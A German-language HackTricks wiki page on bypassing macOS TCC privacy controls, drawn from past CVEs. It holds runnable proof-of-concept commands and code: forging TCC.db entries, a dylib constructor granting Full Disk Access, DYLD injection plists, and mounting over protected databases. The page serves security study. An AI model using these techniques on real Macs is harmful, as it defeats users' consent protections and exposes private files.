# macOS TCC Bypasses

{{#include ../../../../../banners/hacktricks-training.md}}

## Nach Funktionalität

### Write Bypass

Dies ist kein Bypass, sondern einfach die Funktionsweise von TCC: **Es schützt nicht vor Schreibzugriffen**. Wenn Terminal **keinen Zugriff zum Lesen des Desktops eines Benutzers hat, kann es trotzdem darin schreiben**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
Das **erweiterte Attribut `com.apple.macl`** wird der neuen **file** hinzugefügt, um der **creators app** Zugriff zum Lesen zu geben.<sup>[[2]](#references)</sup>

### TCC ClickJacking

Es ist möglich, **ein Fenster über den TCC-Prompt zu legen**, damit der Benutzer ihn **unbemerkt akzeptiert**. Einen PoC findest du in [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**<sup>[[18]](#references)</sup>

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC Request by arbitrary name

Ein Angreifer kann **Apps mit beliebigen Namen** (z. B. Finder, Google Chrome ...) in der **`Info.plist`** erstellen und sie auffordern lassen, auf einen durch TCC geschützten Ort zuzugreifen. Der Benutzer wird denken, dass die legitime Anwendung diesen Zugriff anfordert.\
Außerdem ist es möglich, **die legitime App aus dem Dock zu entfernen und die gefälschte dort zu platzieren**. Wenn der Benutzer auf die gefälschte App klickt (die dasselbe Icon verwenden kann), könnte sie die legitime App aufrufen, TCC-Berechtigungen anfordern und eine Malware ausführen, sodass der Benutzer glaubt, die legitime App habe den Zugriff angefordert.<sup>[[2]](#references)</sup>

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Weitere Informationen und einen PoC findest du unter:


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

Standardmäßig hatte ein Zugriff über **SSH "Full Disk Access"**. Um dies zu deaktivieren, muss SSH aufgelistet, aber deaktiviert sein (durch das Entfernen aus der Liste werden diese Berechtigungen nicht entfernt):<sup>[[2]](#references)</sup>

![TCC Request by arbitrary name - SSH Bypass: Standardmäßig hatte ein Zugriff über SSH "Full Disk Access". Um dies zu deaktivieren, muss SSH aufgelistet, aber deaktiviert sein (durch das Entfernen ...](<../../../../../images/image (1077).png>)

Hier findest du Beispiele dafür, wie einige **malwares diesen Schutz umgehen konnten**:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/) <sup>[[9]](#references)</sup>

> [!CAUTION]
> Beachte, dass du jetzt **Full Disk Access** benötigst, um SSH aktivieren zu können.

### Handle extensions - CVE-2022-26767

Das Attribut **`com.apple.macl`** wird Dateien zugewiesen, um **einer bestimmten Anwendung Berechtigungen zum Lesen zu geben.** Dieses Attribut wird gesetzt, wenn eine Datei per **drag\&drop** auf eine App gezogen wird oder wenn ein Benutzer auf eine Datei **doppelklickt**, um sie mit der **Standardanwendung** zu öffnen.

Daher könnte ein Benutzer eine **bösartige App registrieren**, die alle Erweiterungen verarbeitet, und Launch Services aufrufen, um eine beliebige Datei zu **öffnen** (dadurch erhält die bösartige Datei Zugriff zum Lesen).<sup>[[23]](#references)</sup>

### iCloud

Mit dem Entitlement **`com.apple.private.icloud-account-access`** ist es möglich, mit dem **`com.apple.iCloudHelper`** XPC service zu kommunizieren, das **iCloud-Tokens bereitstellt**.

**iMovie** und **Garageband** verfügten über dieses und weitere Entitlements, die dies ermöglichten.

Weitere **Informationen** zum Exploit, mit dem sich **iCloud-Tokens** über dieses Entitlement abrufen lassen, findest du im Vortrag: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)<sup>[[10]](#references)</sup>

### kTCCServiceAppleEvents / Automation

Eine App mit der Berechtigung **`kTCCServiceAppleEvents`** kann **andere Apps steuern**. Das bedeutet, dass sie möglicherweise die **den anderen Apps gewährten Berechtigungen missbrauchen** kann.<sup>[[2]](#references)</sup>

Weitere Informationen zu Apple Scripts findest du unter:


{{#ref}}
macos-apple-scripts.md
{{#endref}}

Wenn eine App beispielsweise **Automation-Berechtigungen für `iTerm`** hat, kann in diesem Beispiel **`Terminal`** auf iTerm zugreifen:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Über iTerm

Terminal, das kein FDA besitzt, kann iTerm aufrufen, das über diese Berechtigung verfügt, und es zur Ausführung von Aktionen verwenden:
```applescript:iterm.script
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```

```bash
osascript iterm.script
```
#### Über Finder

Oder wenn eine App über Finder Zugriff hat, könnte sie ein Skript wie dieses ausführen:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## Nach App-Verhalten

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

Der **tccd daemon** im Userland verwendete die **`HOME`**-**env**-Variable, um auf die TCC users database unter folgendem Pfad zuzugreifen: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

Laut [diesem Stack Exchange post](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) und da der TCC daemon über **`launchd`** innerhalb der Domain des aktuellen Users ausgeführt wird, ist es möglich, **alle an ihn übergebenen environment variables zu kontrollieren**.<sup>[[19]](#references)</sup>\
Dadurch könnte ein **attacker die `$HOME` environment variable** in **`launchctl`** so setzen, dass sie auf ein **kontrolliertes** **directory** zeigt, den **TCC** daemon **restarten** und anschließend die **TCC database direkt modifizieren**, um sich selbst **jedes verfügbare TCC entitlement** zu geben, ohne den Enduser jemals dazu aufzufordern.<sup>[[1]](#references)</sup>\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Notes

Notes hatte Zugriff auf durch TCC geschützte Orte, aber eine neu erstellte Notiz wurde **an einem nicht geschützten Ort gespeichert**. Daher konnte ein Angreifer Notes anweisen, eine geschützte Datei in eine Notiz zu kopieren, und anschließend auf die resultierenden Daten am nicht geschützten Ort zugreifen:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

Die Binary `/usr/libexec/lsd` mit der Library `libsecurity_translocate` besaß das Entitlement `com.apple.private.nullfs_allow`, wodurch sie **nullfs**-Mounts erstellen konnte, sowie das Entitlement `com.apple.private.tcc.allow` mit **`kTCCServiceSystemPolicyAllFiles`**, um auf jede Datei zuzugreifen.

Es war möglich, das Quarantine-Attribut zu "Library" hinzuzufügen, den **`com.apple.security.translocation`**-XPC-Service aufzurufen, woraufhin Library nach **`$TMPDIR/AppTranslocation/d/d/Library`** gemappt wurde, wo auf alle Dokumente innerhalb von Library **zugegriffen** werden konnte.

### CVE-2024-44131 - FileProvider symlink race

Apps, die Dateioperationen an einen **privilegierten Helper** (hier **`fileproviderd`** / **Files.app**) übergeben, kopieren oder verschieben Elemente **im Auftrag des Benutzers**, sodass der Kopiervorgang mit den Privilegien des Helpers anstelle der Privilegien des Aufrufers ausgeführt wird.

Jamf Threat Labs zeigte, dass die vor der Operation durchgeführte Symlink-Validierung **einer Race Condition ausgesetzt** werden kann: Anstatt den Symlink am **letzten** Pfadbestandteil (der überprüft wird) zu platzieren, tauscht der Angreifer ein **intermediäres** Verzeichnis des Pfads aus, **nachdem der Kopiervorgang bereits begonnen hat**. Der privilegierte Helper folgt anschließend dem vom Angreifer kontrollierten Link und liest oder schreibt TCC-geschützte Orte, **ohne jemals eine Abfrage anzuzeigen**.<sup>[[5]](#references)</sup>

Verzeichnisse, die in ihrem Pfad **nicht** durch eine zufällige UUID geschützt sind (zum Beispiel `~/Library/Mobile Documents/com~apple~CloudDocs`), sind die einfachsten Ziele, da der Angreifer den vollständigen Pfad für die Race Condition vorhersagen kann.

> [!TIP]
> Dies ist das generische Muster, nach dem gesucht werden sollte: **Jeder privilegierte Prozess, der einen Pfad mehr als einmal auflöst** (Check-then-use oder ein separates Auflösen von Quelle und Ziel durch `rename()`/`copyfile()`) kann durch das Austauschen eines Verzeichnisses in der Mitte des Pfads einer Race Condition ausgesetzt werden. Nur `O_NOFOLLOW_ANY`, `openat()` für einen bereits geöffneten Verzeichnis-FD oder `realpath()` + erneute Validierung schließen dieses Zeitfenster tatsächlich.

Weitere Informationen finden sich im [**Bericht von Jamf Threat Labs**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/).<sup>[[5]](#references)</sup>

### SQLITE_SQLLOG_DIR

`libsqlite3` kann mit `SQLITE_ENABLE_SQLLOG` kompiliert werden, wodurch ein durch Umgebungsvariablen gesteuerter Logging-Hook hinzugefügt wird ([upstream `test_sqllog.c`](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)):<sup>[[6]](#references)</sup>

- **`SQLITE_SQLLOG_DIR=path`** – für **jede geöffnete Datenbank** werden eine **Kopie der Datenbankdatei** und ein Log der SQL-Anweisungen in `path` geschrieben (das Verzeichnis muss bereits existieren).
- **`SQLITE_SQLLOG_REUSE_FILES=0`** – bei jedem Öffnen/Anhängen einer DB eine **neue Kopie** erstellen, anstatt eine vorhandene wiederzuverwenden.
- **`SQLITE_SQLLOG_CONDITIONAL`** – eine Verbindung nur dann protokollieren, wenn neben der Haupt-DB eine Datei `<database>-sqllog` existiert.

Wenn diese Variable in einen Prozess eingeschleust werden kann, der über **FDA** verfügt und SQLite-Datenbanken öffnet, kopiert dieser bereitwillig **diese geschützten Datenbanken** in ein von dir kontrolliertes Verzeichnis. Da der Zieldateiname aus vom Angreifer kontrollierten Daten abgeleitet wird, verwandelt ein am Ziel platzierter **Symlink** dasselbe Primitive in einen **beliebigen Dateischreibvorgang** mit den Privilegien des Zielprozesses.

### **SQLITE_AUTO_TRACE**

Wenn die Umgebungsvariable **`SQLITE_AUTO_TRACE`** gesetzt ist, beginnt die Library **`libsqlite3.dylib`**, alle SQL-Abfragen zu **protokollieren**. Viele Anwendungen verwendeten diese Library, sodass es möglich war, alle ihre SQLite-Abfragen zu protokollieren.<sup>[[22]](#references)</sup>

Mehrere Apple-Anwendungen verwendeten diese Library, um auf durch TCC geschützte Informationen zuzugreifen.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### Aufspüren von durch Umgebungsvariablen gesteuerten Dateischreibvorgängen

Die beiden vorherigen Einträge sind Beispiele für dieselbe generische Technik, und es lohnt sich, nach weiteren zu suchen: **In TCC-privilegierte Apps geladene frameworks stellen häufig Debug-/Logging-Umgebungsvariablen bereit, durch die der Prozess eine Datei an einem vom Aufrufer kontrollierten Pfad erstellt**.

Vorgehensweise:

1. Wähle ein Ziel mit FDA oder einer anderen interessanten TCC-Berechtigung (`Music`, `TV`, `Terminal`, MDM agents...) und liste die frameworks auf, mit denen es verknüpft ist (`otool -L`, `vmmap`).
2. Durchsuche diese frameworks nach `getenv`-Strings: `strings -a /System/Library/Frameworks/<X>.framework/<X> | grep -iE '^[A-Z0-9_]{6,}$'`.
3. Setze Kandidatenvariablen über `launchctl setenv NAME /path/you/control`, starte die App und beobachte mit `fs_usage -w -f filesys <pid>` oder `sudo fs_usage | grep <path>`, was sie im Dateisystem macht.
4. Wenn der Prozess eine Datei in deinem Verzeichnis **erstellt oder umbenennt**, hast du ein write primitive: Zeige das Ziel auf einen Symlink (oder race ein Zwischenverzeichnis, wie oben bei CVE-2024-44131), um die Datei nach `~/Library/Application Support/com.apple.TCC/TCC.db` umzuleiten.

> [!TIP]
> Zwei Dinge schränken dies ein. Erstens werden **`DYLD_*`-Variablen bei Binaries mit hardened runtime ignoriert**, sofern die App nicht das Entitlement [`com.apple.security.cs.allow-dyld-environment-variables`](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables) enthält („a Boolean value that indicates whether the app may be affected by dynamic linker environment variables, which you can use to inject code into your app's process“) — siehe auch [Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/). Zweitens entfernt Apple einzelne framework-Debugvariablen, sobald diese gemeldet werden. Daher ist eine Variable, die in einer macOS-Version funktioniert hat, in der nächsten häufig verschwunden. Wenn eine App nach dem Setzen einer solchen Variable die Ausführung stillschweigend verweigert, solltest du davon ausgehen, dass diese Variable bereits gefiltert wird.<sup>[[7]](#references)[[8]](#references)</sup>

Unter [macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES](../../../macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md) findest du den entsprechenden Trick mit linker variables.

### Apple Remote Desktop

Als root könntest du diesen Service aktivieren, und der **ARD agent hätte full disk access**, was anschließend von einem Benutzer missbraucht werden könnte, um eine neue **TCC user database** zu kopieren.

## Über **NFSHomeDirectory**

TCC verwendet eine Datenbank im HOME-Ordner des Benutzers, um den Zugriff auf benutzerspezifische Ressourcen unter **$HOME/Library/Application Support/com.apple.TCC/TCC.db** zu kontrollieren.\
Wenn es dem Benutzer daher gelingt, TCC mit einer $HOME-Umgebungsvariable neu zu starten, die auf einen **anderen Ordner** zeigt, könnte der Benutzer eine neue TCC-Datenbank unter **/Library/Application Support/com.apple.TCC/TCC.db** erstellen und TCC dazu bringen, einer beliebigen App jede TCC-Berechtigung zu gewähren.

> [!TIP]
> Beachte, dass Apple für den **Wert von `$HOME`** die Einstellung verwendet, die im Benutzerprofil im Attribut **`NFSHomeDirectory`** gespeichert ist. Wenn du eine Anwendung mit Berechtigungen zum Ändern dieses Werts (**`kTCCServiceSystemPolicySysAdminFiles`**) kompromittierst, kannst du diese Option mit einem TCC bypass **weaponize**.

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

Der **erste POC** verwendet [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) und [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/), um den **HOME**-Ordner des Benutzers zu ändern.

1. Rufe einen _csreq_-Blob für die Ziel-App ab.
2. Platziere eine gefälschte _TCC.db_-Datei mit den erforderlichen Zugriffsrechten und dem _csreq_-Blob.
3. Exportiere den Directory-Services-Eintrag des Benutzers mit [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Ändere den Directory-Services-Eintrag, um das Home-Verzeichnis des Benutzers zu ändern.
5. Importiere den geänderten Directory-Services-Eintrag mit [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Stoppe das _tccd_ des Benutzers und starte den Prozess neu.

Der zweite POC verwendete **`/usr/libexec/configd`**, das `com.apple.private.tcc.allow` mit dem Wert `kTCCServiceSystemPolicySysAdminFiles` besaß.\
Es war möglich, **`configd`** mit der Option **`-t`** auszuführen; ein Angreifer konnte ein **custom Bundle zum Laden** angeben. Daher **ersetzt** der Exploit die Methode zum Ändern des Home-Verzeichnisses über **`dsexport`** und **`dsimport`** durch eine **`configd` code injection**.

Weitere Informationen findest du im [**original report**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).<sup>[[11]](#references)</sup>

## Über process injection

Es gibt verschiedene Techniken, um Code in einen Prozess zu injizieren und dessen TCC-Berechtigungen zu missbrauchen:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

Darüber hinaus erfolgt der häufigste gefundene process injection zum Umgehen von TCC über **plugins (load library)**.\
Plugins sind zusätzlicher Code, üblicherweise in Form von libraries oder plist-Dateien, der **von der Hauptanwendung geladen** wird und unter deren Kontext ausgeführt wird. Wenn die Hauptanwendung daher Zugriff auf TCC-beschränkte Dateien hatte (über gewährte Berechtigungen oder entitlements), hat auch der **custom code diesen Zugriff**.

### CVE-2020-27937 - Directory Utility

Die Anwendung `/System/Library/CoreServices/Applications/Directory Utility.app` besaß das Entitlement **`kTCCServiceSystemPolicySysAdminFiles`**, lud plugins mit der Erweiterung **`.daplug`** und verwendete keine **hardened** runtime.

Um diese CVE zu weaponize, wird **`NFSHomeDirectory`** geändert (unter Ausnutzung des vorherigen Entitlements), damit die **TCC-Datenbank des Benutzers übernommen** und TCC umgangen werden kann.

Weitere Informationen findest du im [**original report**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).<sup>[[12]](#references)</sup>

### CVE-2020-29621 - Coreaudiod

Das Binary **`/usr/sbin/coreaudiod`** besaß die Entitlements `com.apple.security.cs.disable-library-validation` und `com.apple.private.tcc.manager`. Das erste **ermöglichte code injection**, während das zweite Zugriff auf die **Verwaltung von TCC** gewährte.

Dieses Binary konnte **third-party plug-ins** aus dem Ordner `/Library/Audio/Plug-Ins/HAL` laden. Daher war es möglich, mit diesem PoC ein **plugin zu laden und die TCC-Berechtigungen zu missbrauchen**:<sup>[[13]](#references)</sup>
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
Weitere Informationen finden Sie im [**original report**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).<sup>[[13]](#references)</sup>

### Device Abstraction Layer (DAL) Plug-Ins

Systemanwendungen, die einen Kamerastream über Core Media I/O öffnen (Apps mit **`kTCCServiceCamera`**), laden diese im Prozess befindlichen Plug-ins aus `/Library/CoreMediaIO/Plug-Ins/DAL` (nicht durch SIP eingeschränkt).

Allein das Ablegen einer Bibliothek mit dem üblichen **constructor** an diesem Ort reicht aus, um **Code zu injizieren**.

Mehrere Apple-Anwendungen waren dafür anfällig.

### Firefox

Die Firefox-Anwendung verfügte über die Entitlements `com.apple.security.cs.disable-library-validation` und `com.apple.security.cs.allow-dyld-environment-variables`:<sup>[[14]](#references)</sup>
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
Weitere Informationen dazu, wie man dies einfach ausnutzen kann, findest du im [**original report**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).<sup>[[14]](#references)</sup>

### CVE-2020-10006

Die Binärdatei `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` verfügte über die Entitlements **`com.apple.private.tcc.allow`** und **`com.apple.security.get-task-allow`**, wodurch Code in den Prozess injiziert und die TCC-Rechte verwendet werden konnten.

### CVE-2023-26818 - Telegram

Telegram verfügte über die Entitlements **`com.apple.security.cs.allow-dyld-environment-variables`** und **`com.apple.security.cs.disable-library-validation`**, sodass es möglich war, dies zu missbrauchen, um **Zugriff auf seine Berechtigungen zu erhalten**, beispielsweise für Aufnahmen mit der Kamera. Du kannst [**das Payload im writeup finden**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).<sup>[[15]](#references)</sup>

Beachte, dass zur Verwendung der env variable zum Laden einer library ein **custom plist** erstellt wurde, um diese library zu injizieren, und **`launchctl`** zum Starten verwendet wurde:<sup>[[15]](#references)</sup>
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## Durch `open`-Aufrufe

Es ist möglich, **`open`** auch innerhalb einer Sandbox aufzurufen.

### Terminal Scripts

Es ist ziemlich üblich, Terminal **Full Disk Access (FDA)** zu gewähren, zumindest auf Computern, die von technisch versierten Personen verwendet werden. Damit ist es möglich, **`.terminal`**-Skripte aufzurufen.

**`.terminal`**-Skripte sind plist-Dateien wie diese, wobei der auszuführende Befehl im Schlüssel **`CommandString`** enthalten ist:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
Eine Anwendung könnte ein Terminal-Skript an einem Ort wie /tmp schreiben und es mit einem Befehl wie folgt starten:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## Durch Einhängen

### CVE-2020-9771 – TCC-Bypass und Privilege Escalation durch mount_apfs

**Jeder Benutzer** (auch Benutzer ohne Privilegien) kann einen Time-Machine-Snapshot erstellen und einhängen und auf **ALLE Dateien** dieses Snapshots zugreifen.\
Die **einzige erforderliche Berechtigung** besteht darin, dass die verwendete Anwendung (wie `Terminal`) über **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`) verfügen muss, der von einem Administrator gewährt werden muss.<sup>[[2]](#references)</sup>
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
Eine ausführlichere Erklärung ist im [**Originalbericht zu finden**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**<sup>[[20]](#references)</sup>

### CVE-2021-1784 & CVE-2021-30808 - Mount über TCC-Datei

Auch wenn die TCC-DB-Datei geschützt ist, war es möglich, **ein neues TCC.db über das Verzeichnis zu mounten**:
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
Überprüfe den **vollständigen Exploit** im [**original writeup**](https://theevilbit.github.io/posts/cve-2021-30808/).<sup>[[21]](#references)</sup>

### CVE-2024-40855

Wie im [original writeup](https://www.kandji.io/blog/macos-audit-story-part2) erklärt, nutzte diese CVE `diskarbitrationd` aus.<sup>[[16]](#references)</sup>

Die Funktion `DADiskMountWithArgumentsCommon` aus dem öffentlichen `DiskArbitration`-Framework führte die Sicherheitsprüfungen durch. Es ist jedoch möglich, diese zu umgehen, indem `diskarbitrationd` direkt aufgerufen wird und dadurch `../`-Elemente im Pfad sowie Symlinks verwendet werden.

Dies ermöglichte es einem Angreifer, beliebige Mounts an jedem Ort durchzuführen, einschließlich über der TCC-Datenbank, da `diskarbitrationd` über das Entitlement `com.apple.private.security.storage-exempt.heritable` verfügt.

### asr

Das Tool **`/usr/sbin/asr`** ermöglichte es, die gesamte Festplatte zu kopieren und sie an einem anderen Ort zu mounten, wodurch TCC-Schutzmechanismen umgangen wurden.

### CVE-2022-22655 - Location Services

Location Services werden **nicht** wie die anderen Services in einer TCC-Datenbank gespeichert. Sie werden von `locationd` verwaltet, das seine eigene Allow-Liste unter **`/var/db/locationd/clients.plist`** führt:<sup>[[4]](#references)</sup>
```bash
# Requires FDA to read
sudo plutil -p /var/db/locationd/clients.plist | head -40
```
Jeder Eintrag ist nach dem Client (Bundle ID oder ausführbarer Pfad) indiziert und enthält Felder wie `Authorized`, `BundleId`, `Executable` und `Registered`.<sup>[[4]](#references)</sup>

Die Datei `clients.plist` selbst ist durch Sandbox/TCC geschützt und kann nicht einmal als root bearbeitet werden — das Verzeichnis **`/var/db/locationd/` war jedoch nicht vor dem Mounten geschützt**. Ein als root ausgeführter Angreifer konnte daher ein Disk-Image mit einer eigenen `clients.plist` erstellen (in der die eigene Binary als `Authorized` markiert war), es über das Verzeichnis mounten und `locationd` neu starten, damit die gefälschte Allow-List wirksam wurde.<sup>[[3]](#references)</sup>

> [!TIP]
> Dies entspricht demselben Muster wie bei den obigen `hdiutil`/`mount`-TCC-bypasses: Die *Datei* ist geschützt, das *Verzeichnis, in dem sie liegt*, jedoch nicht. Daher ersetzt man das gesamte Verzeichnis statt die Datei.

## Über Startup-Apps


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## Über grep

Bei mehreren Gelegenheiten speichern Dateien sensible Informationen wie E-Mail-Adressen, Telefonnummern, Nachrichten ... an nicht geschützten Speicherorten (was bei Apple als Schwachstelle gilt).

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

Dies funktioniert nicht mehr, war aber [**in der Vergangenheit möglich**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

Eine weitere Methode mit [**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf):<sup>[[17]](#references)</sup>

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## References

- [1] [CVE-2020–9934: Umgehen des macOS-Frameworks Transparency, Consent, and Control (TCC)](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
